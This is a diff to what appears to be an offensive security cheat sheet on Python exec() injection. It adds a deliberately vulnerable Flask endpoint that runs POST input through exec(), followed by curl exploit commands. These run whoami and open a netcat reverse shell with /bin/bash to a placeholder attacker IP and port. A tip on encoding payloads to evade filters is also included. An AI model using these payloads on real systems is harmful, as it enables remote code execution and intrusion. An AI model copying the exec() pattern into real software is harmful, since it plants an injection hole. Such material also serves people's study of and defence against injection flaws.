@@ -144,9 +144,26 @@ Exploiting the code , we can pass valid python logic to exec(). This can also be
 ```
 Input: __import__('os').system.listdir() 
 ```
-Web app passes user-input to exec()
+Vulnerable Web app passes user-input to exec()
 ```
+import pickle
+import base64
+from flask import Flask, request
+
+app = Flask(__name__)
 
 
+@app.route("/api", methods=["POST"])
+def hackme():
+    data = exec(request.form['request'])
+    input = data
+    print(input)
+```
+Exploiting the web app. Paramater can also be URLEncoded or Base64 encoded to remove bad chars
+```
+curl -X POST -d "request=print('Hello There')" http://127.0.0.1:5000/api
+curl -X POST -d "request=__import__(‘os’).system(‘whoami’)" http://127.0.0.1:5000/api
+curl -X POST -d "request=__import__('os').popen('whoami').read()" http://127.0.0.1:5000/api
+curl -X POST -d "request=__import__('os').popen('nc -e /bin/bash <attacker_ip> <attacker_port>').read()" http://127.0.0.1:5000/api
 ```
 
